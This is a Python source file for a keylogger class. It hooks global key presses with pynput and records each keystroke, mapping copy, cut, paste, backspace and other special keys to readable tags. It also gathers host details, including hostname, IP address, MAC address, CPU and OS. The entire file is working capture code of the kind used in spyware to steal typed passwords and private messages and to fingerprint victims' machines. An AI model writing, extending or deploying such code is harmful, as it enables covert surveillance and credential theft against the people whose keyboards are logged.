from IKeyLogger import IKeyLogger
from pynput.keyboard import Listener
from getmac import get_mac_address
import socket
import platform

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.data = []
        self.key_str = ""
        self.listener = None
        self.info = {}

    def on_press(self, key):
        self.key_str = str(key).replace("'", "")
        if self.key_str=='Key.shift':
            self.key_str=' [shift] '
        if self.key_str=="Key.caps_lock":
            self.key_str= " [caps_lock] "
        if self.key_str=='Key.alt_l':
            self.key_str=' [alt_l] '
        if self.key_str == 'Key.space':
            self.key_str = ' '
        if self.key_str == 'Key.enter':
            self.key_str = '\n'
        if self.key_str == 'Key.up':
            self.key_str = ' '
        if self.key_str == 'Key.right':
            self.key_str = ' '
        if self.key_str == 'Key.left':
            self.key_str = ' '
        if self.key_str == 'Key.down':
            self.key_str = '\n'
        if self.key_str == 'Key.ctrl_l':
            self.key_str = ' [ctrl] '
        if self.key_str == '\\x03':
            self.key_str = ' [copy] '
        if self.key_str == 'Key.backspace':
            self.key_str = ' [backspace] '
        if self.key_str == '\\x18':
            self.key_str = ' [cut] '
        if self.key_str == '\\x16':
            self.key_str = ' [paste] '
        if self.key_str=='<97>':
            self.key_str='1'
        if self.key_str=='<98>':
            self.key_str='2'
        if self.key_str=='<99>':
            self.key_str='3'
        if self.key_str=='<100>':
            self.key_str='4'
        if self.key_str=='<101>':
            self.key_str='5'
        if self.key_str=='<102>':
            self.key_str='6'
        if self.key_str=='<103>':
            self.key_str='7'
        if self.key_str=='<104>':
            self.key_str='8'
        if self.key_str=='<105>':
            self.key_str='9'
        self.data.append(self.key_str)


    def start_logging(self) -> None:
        self.listener=Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self) -> None:
        if self.key_str == "@":
            exit()

    def get_logged_keys(self) -> list[str]:
        return self.data

    def system_information(self):
        self.info['name'] = socket.gethostname()
        self.info['ip'] = socket.gethostbyname(self.info['name'])
        self.info['cpu'] = platform.processor()
        self.info['os'] = platform.system()
        self.info['type_of_machine'] = platform.machine()
        self.info['mac'] = get_mac_address()

        return self.info







